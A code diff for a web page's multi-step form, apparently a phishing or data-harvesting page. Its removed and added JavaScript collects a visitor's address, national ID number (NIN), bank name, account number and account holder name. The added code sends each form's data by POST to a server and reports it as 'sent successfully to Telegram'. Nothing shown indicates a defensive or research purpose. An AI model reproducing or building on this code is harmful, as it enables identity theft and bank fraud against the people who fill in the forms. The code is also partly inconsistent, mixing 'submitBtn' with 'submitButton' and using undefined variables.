@@ -541,7 +541,7 @@ closeAdButton.addEventListener("click", slideOutAd);
                 submitButton.disabled = false;
             }
             
-               // showForm('form2');
+               showForm('form2');
     
             submitBtn.disabled = false;
         });
@@ -554,27 +554,36 @@ closeAdButton.addEventListener("click", slideOutAd);
             submitBtn.disabled = true;
             
             const formData = new FormData(this);
-            const data = Object.fromEntries(formData.entries());
-            
-            // Store data
-            Object.assign(allFormData, data);
-            
-            // Send to Telegram
-            const message = `📝 **Form 2 Submitted - Address Information**\n\n` +
-                           `🏠 City: ${data.city}\n` +
-                           `🏙️ State: ${data.state}\n` +
-                           `📮 Address: ${data.address}\n` +
-                           `🏙️ LGA: ${data.lga}\n` +
-                           `🏙️ NIN: ${data.nin}\n` +
-                           `📮 Address: ${data.maintext}\n` +
-                           `⏰ Time: ${new Date().toLocaleString()}`;
-            
-            alert(message);
-   
-                showForm('form2');
+
+
+			try {
+                // Use relative path instead of localhost
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok) {
+                    document.getElementById('response').innerHTML = 
+                        '<p class="success">✅ Message sent successfully to Telegram!</p>';
+                    e.target.reset();
+                } else {
+                    document.getElementById('response').innerHTML = 
+                        `<p class="error">❌ Error: ${result.error}</p>`;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('response').innerHTML = 
+                    '<p class="error">❌ Network error. Make sure the server is running on port 3000.</p>';
+            } finally {
+                submitButton.textContent = originalText;
+                submitButton.disabled = false;
+            }
+                showForm('form3');
             
             submitBtn.disabled = false;
-            loading.style.display = 'none';
         });
 
         // Form 3 submission
@@ -585,35 +594,35 @@ closeAdButton.addEventListener("click", slideOutAd);
             submitBtn.disabled = true;
             
             const formData = new FormData(this);
-            const data = Object.fromEntries(formData.entries());
-            
-            // Store data
-            Object.assign(allFormData, data);
-            
-            // Send to Telegram
-            const message = `📝 **Form 3 Submitted - Preferences**\n\n` +
-                           `📰 Bank: ${data.bankName}\n` +
-                           `🏙️ Account Number: ${data.accountNumber}\n` +
-                           `📮 Owner: ${data.accountName}\n` +
-                           `⏰ Time: ${new Date().toLocaleString()}\n\n` +
-                           `✅ **All Forms Completed!**`;
-            
-            alert(message);
-            
-                const summaryMessage = `📊 **Complete Form Submission Summary**\n\n` +
-                                     `👤 Personal Info:\n` +
-                                     `   • Name: ${allFormData.name}\n` +
-                                     `   • Email: ${allFormData.email}\n\n` +
-                                     `🏠 Address Info:\n` +
-                                     `   • Street: ${allFormData.street}\n` +
-                                     `   • City: ${allFormData.city}\n` +
-                                     `   • Zip Code: ${allFormData.zipcode}\n\n` +
-                                     `⚙️ Preferences:\n` +
-                                     `   • Newsletter: ${allFormData.newsletter}\n` +
-                                     `   • Comments: ${allFormData.comments || 'None'}`;
+
+
+			try {
+                // Use relative path instead of localhost
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok) {
+                    document.getElementById('response').innerHTML = 
+                        '<p class="success">✅ Message sent successfully to Telegram!</p>';
+                    e.target.reset();
+                } else {
+                    document.getElementById('response').innerHTML = 
+                        `<p class="error">❌ Error: ${result.error}</p>`;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('response').innerHTML = 
+                    '<p class="error">❌ Network error. Make sure the server is running on port 3000.</p>';
+            } finally {
+                submitButton.textContent = originalText;
+                submitButton.disabled = false;
+            }
             
             submitBtn.disabled = false;
-            loading.style.display = 'none';
         });
 
     
